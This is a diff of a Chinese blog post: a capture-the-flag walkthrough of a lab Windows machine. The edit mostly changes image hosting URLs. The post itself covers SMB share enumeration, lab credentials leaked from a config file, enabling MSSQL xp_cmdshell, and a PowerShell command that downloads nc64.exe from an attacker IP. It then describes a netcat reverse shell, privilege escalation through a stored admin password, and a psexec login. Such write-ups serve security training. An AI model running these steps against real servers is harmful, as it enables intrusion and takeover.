@@ -199,7 +199,7 @@
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2023-02-03 14:21:16</span>
+        <span class="pc">2023-02-03 14:35:41</span>
     </span>
     
     
@@ -248,57 +248,60 @@
 <span id="more"></span>
 
 <p>常规nmap扫描</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/pico20230202/image-20230203093701635.png" alt="1"></p>
 <p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203093701635.png" alt="image-20230203093701635"></p>
 <p>可以看到139和445端口开了smb服务，1433端口开了数据库。</p>
 <p>用smbclient连接</p>
 <p><code>smbclient -L 10.129.251.225</code> 列出共享文件</p>
-<img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203095017636.png" alt="image-20230203095017636" style="zoom: 80%;" />
+<img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/pico20230202/image-20230203095017636.png" alt="image-20230203095017636" style="zoom: 80%;" />
+
+
 
 <p>连接backups文件夹</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203095632714.png" alt="image-20230203095632714"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203095632714.png" alt="image-20230203095632714"></p>
 <p>将prod.dtsConfig文件get到本地查看，得到passwd:M3g4c0rp123，user id:ARCHETYPE\SqL_svc</p>
 <p>接下来利用impacket包下的mssqlclient.py与数据库建立连接</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203111715329.png" alt="image-20230203111715329"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203111715329.png" alt="image-20230203111715329"></p>
 <p>执行SELECT IS_SRVROLEMEMBER(‘sysadmin’) 查看权限，回显1，表示当前用户有sysadmin权限</p>
 <p>接着enable_xp_cmdshell; 获取xp_cmdshell</p>
 <p><code>xp_cmdshell 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 sql servevr 的原生工具</code></p>
 <p>也就是说把xp_cmdshell开启后，可以在sql中执行系统命令。</p>
 <p>本地监听80端口</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203112527428.png" alt="image-20230203112527428"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203112527428.png" alt="image-20230203112527428"></p>
 <p>访问可以看到我们本机的文件</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203112601959.png" alt="image-20230203112601959"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203112601959.png" alt="image-20230203112601959"></p>
 <p>也就是说，我们可以将payload放在本机中，然后通过xp_cmdshell来访问我们本机文件来下载到目标服务器</p>
 <p>然后本地nc监听，目标服务器使用nc连接获取shell</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203114202164.png" alt="image-20230203114202164"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203114202164.png" alt="image-20230203114202164"></p>
 <p>通过wget下载，发现没有权限</p>
 <p>换个有执行写入权限的目录</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203114914029.png" alt="image-20230203114914029"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203114914029.png" alt="image-20230203114914029"></p>
 <p><code>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.10/nc64.exe -outfile nc64.exe&quot;</code></p>
 <p>切换到downloads目录，通过wget获取到本机nc64.exe下载到目录下</p>
 <p><code>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;dir&quot;</code></p>
 <p>dir查看文件是否下载成功</p>
 <p>开启nc监听4443端口</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203115240746.png" alt="image-20230203115240746"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203115240746.png" alt="image-20230203115240746"></p>
 <p>主机执行以下命令，开启nc</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203122631401.png" alt="image-20230203122631401"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203122631401.png" alt="image-20230203122631401"></p>
 <p>反弹成功</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203122730858.png" alt="image-20230203122730858"></p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203123648716.png" alt="image-20230203123648716"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203122730858.png" alt="image-20230203122730858"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203123648716.png" alt="image-20230203123648716"></p>
 <p>拿到user下的flag</p>
 <p>接下来，提权到root用户</p>
 <p>使用到WinPEAS工具，这个 WinPEAS 是一个脚本，用于搜索在 Windows 主机上提升权限的可能方法，进行扫描</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203125218952.png" alt="image-20230203125218952"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203125218952.png" alt="image-20230203125218952"></p>
 <p>在主机上执行</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203125615881.png" alt="image-20230203125615881"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203125615881.png" alt="image-20230203125615881"></p>
 <p>在第一个文件中查看到了administrator的密码MEGACORP_4dm1n!!，这个ConsoleHost_history.txt是powershell的历史文件，相当于 Linux 系统的.bash_history</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203125531424.png" alt="image-20230203125531424"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203125531424.png" alt="image-20230203125531424"></p>
 <p>接下来使用impacket包下的psexec.py进行连接登录</p>
 <pre><code>PsExec 是一个轻型的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。PsExec 最强大的功能之一是在远程系统和远程支持工具（如 IpConfig）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。
 </code></pre>
 <p>最后连接这里，一直连接出错，就重启了台机器。</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203140247659.png" alt="image-20230203140247659"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203140247659.png" alt="image-20230203140247659"></p>
 <p>得到root权限下的flag</p>
-<p><img src="https://raw.githubusercontent.com/n3ym4r/image/master/pico20230202/image-20230203140457559.png" alt="image-20230203140457559"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image/master/pico20230202/image-20230203140457559.png" alt="image-20230203140457559"></p>
 
         </div>
 
